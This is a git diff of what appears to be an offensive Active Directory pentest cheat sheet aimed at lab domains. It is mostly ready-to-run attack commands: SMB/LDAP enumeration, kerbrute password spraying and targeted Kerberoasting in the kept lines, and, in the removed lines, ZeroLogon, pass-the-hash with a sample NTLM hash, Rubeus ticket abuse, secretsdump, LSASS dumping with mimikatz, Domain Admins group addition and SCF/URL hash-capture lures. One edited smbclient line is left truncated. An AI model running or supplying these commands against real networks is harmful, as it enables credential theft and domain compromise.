@@ -17,7 +17,6 @@ mkdir nmap; sudo nmap -s -p- 192.168.32.0/24 -oA nmap/sweep.nmap -T4
 nmap -Pn -p- -sC -sV -oA full_scan 192.168.32.10-12
 
 nslookup -type=srv _ldap._tcp.dc._msdcs.$dom $ip
-
 python /opt/evil-winrm-krb-configurator.py $dom DC01
 
 sudo autorecon $ip --subdomain-enum.domain $dom --global.domain $dom
@@ -35,17 +34,10 @@ enum4linux-ng $ip
 enum4linux-ng $ip -A -C
 enum4linux-ng $ip -u $user -p $pass -oY out
 
-# Find user list
-enum4linux -U $dcip | grep 'user:'
-nxc smb $ip auth_method --users | awk '{print $5}' | tr -s -c ' ' >> users.txt
-
-# ZeroLogon
-python /opt/cve-2020-1472-exploit.py $bios $ip
-nxc smb $ip auth_method -M zerologon
-
 smbclient -L //$ip
 smbclient -N -L //$ip
 smbclient -L //$ip -N
+
 
 nxc smb $ip -u 'a' -p '' --shares
 nxc smb $ip -u 'a' -p '' --all
@@ -57,7 +49,7 @@ nxc smb $ip -u ‘guest’ -p ‘’ --rid-brute # If IPC$ is readable
 nxc smb $ip -u ‘guest’ -p ‘’ --rid-brute > u.txt
 
 smbmap -u "" -p "" -P 445 -H $ip && smbmap -u "guest" -p "" -P 445 -H $ip
-smbclient -U '%' -L //$dcip && smbclient -U 'guest%' -L //$dcip # $dcip
+smbclient -U '%' -L //$ip && smbclient -U 'guest%' -L //
 smbclient —kerberos //$dc/share
 smbclient.py -k @braavos.essos.local
 smbclient.py -k -no-pass @winterfell.north.sevenkingdoms.local
@@ -119,6 +111,8 @@ for i in $(cat users.txt); do echo "$i:$i" >> combo.txt; done
 /opt/kerbrute bruteforce combo.txt -d $dom --dc $ip
 /opt/kerbrute passwordspray -d $dom --dc $ip users.txt $pass
 
+psexec.py
+
 impacket-GetADUsers -dc-ip $ip "$dom/" -all
 impacket-GetADUsers -dc-ip $ip $dom/$user:$pass -all
 
@@ -150,8 +144,6 @@ source /opt/targetedKerberoast/venv/bin/activate
 python /opt/targetedKerberoast/targetedKerberoast.py -d $dom -u $user -p $pass --dc-ip $ip
 python /opt/targetedKerberoast/targetedKerberoast.py -d $dom -u $user -p $pass --dc-ip $ip -o kerberload.txt
 python /opt/windows/targetedKerberoast/targetedKerberoast.py -d $dom -u $user -p $pass --dc-ip $ip
-net group "domain admins" myuser /add /domain
-impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip "$dom"/"$user":"$pass"
 
 python /opt/windows/bloodyAD/bloodyAD.py --host $dc -d $dom -u $user -p $pass -k get writable --right WRITE --detail
 python /opt/windows/bloodyAD/bloodyAD.py --host $ip -d $dom -u $user -p $pass get writable --otype USER --right WRITE --detail | egrep -i 'distinguishedName|servicePrincipalName' # Check for interesting permissions on accounts:
@@ -189,33 +181,6 @@ evil-winrm -i $ip -P 5986 -c pub.pem -k priv.pem -S -r $dom
 KRB5CCNAME=/home/kali/htb/absolute/svc_smb.ccache nxc ldap -u $user -p $pass -k -M adcs $dc
 ldapsearch -H ldap://dc.absolute.htb -b "dc=absolute,dc=htb"
 
-# Kerberos Execution
-psexec.py <domain>/<user>@<ip> -k -no-pass
-atexec.py <domain>/<user>@<ip> -k -no-pass "command"
-wmiexec.py <domain>/<user>@<ip> -k -no-pass
-
-# Pass the hash
-psexec.py -hashes ":<hash>" <user>@<ip>
-atexec.py -hashes ":<hash>" <user>@<ip> "command"
-wmiexec.py -hashes ":<hash>" <user>@<ip>
-evil-winrm -i <ip>/<domain> -u <user> -H <hash>
-xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>
-pth-smbclient -U "$dom/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2...A" //192.168.10.100/Share
-nxc smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
-nxc smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
-nxc smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
-nxc smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
-
-
-# Overpass the Hash / Pass the Key (PTK)
-Rubeus ptt /ticket:<ticket>
-Rubeus asktgt /user:victim /rc4:<rc4value>
-Rubeus createnetonly /program:C:\Windows\System32\[cmd.exe||upnpcont.exe]
-Rubeus ptt /luid:0xdeadbeef /ticket:<ticket>
-
-# Dump Credentials from AD Domain
-secretsdump.py '<domain>/<user>:<pass>'@<ip>
-
 Invoke-adPEAS -Domain 'access.offsec' -Server 'dc.access.offsec' -Username 'access\svc_mssql' -Password 'trustno1' -Force
 Invoke-ADEnum -AllEnum -Force
 .\pingcastle.exe --healthcheck --user access\svc_mssql --password trustno1 --level Full
@@ -223,54 +188,4 @@ Invoke-ADEnum -AllEnum -Force
 .\Seatbelt.exe -group=all
 ```
 
-## One and Done
-
-Can have a boolean flag for each to see if completed.
-
-```bash
-# Petite Potam
-nxc smb $ip -u $user -p $pass -M petitpotam # Check
-nxc smb $ip -u $user -p $pass -M petitpotam
-
-# CVE-2020-1472 ZeroLogon
-```
-
 "https://www.thehacker.recipes/ad/movement/"
-
-## Windows
-
-```bash
-# Pass the hash
-mimikatz "privilege::debug sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash>"
-xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>
-
-# Overpass the Hash / Pass the Key (PTK)
-Rubeus ptt /ticket:<ticket>
-Rubeus asktgt /user:victim /rc4:<rc4value>
-Rubeus createnetonly /program:C:\Windows\System32\[cmd.exe||upnpcont.exe]
-Rubeus ptt /luid:0xdeadbeef /ticket:<ticket>
-
-# Quick PE
-procdump.exe -accepteula -ma lsass.exe lsass.dmp
-mimikatz "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" "exit"
-mimikatz sekurlsa::tickets /export
-
-# Get Applocker Info
-Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
-
-# Dump Credentials
-mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
-
-# SMB WRITE Permission on Windows
-# Write SCF and URL files on a writeable share to farm for user's hashes and eventually replay them.
-
-# Farmer to receive auth
-farmer.exe <port> [seconds] [output]
-farmer.exe 8888 0 c:\windows\temp\test.tmp # undefinitely
-farmer.exe 8888 60 # one minute
-
-# Crop can be used to create various file types that will trigger SMB/WebDAV connections for poisoning file shares during hash collection attacks
-crop.exe <output folder> <output filename> <WebDAV server> <LNK value> [options]
-Crop.exe \\\\fileserver\\common mdsec.url \\\\workstation@8888\\mdsec.ico
-Crop.exe \\\\fileserver\\common mdsec.library-ms \\\\workstation@8888\\mdsec
-```
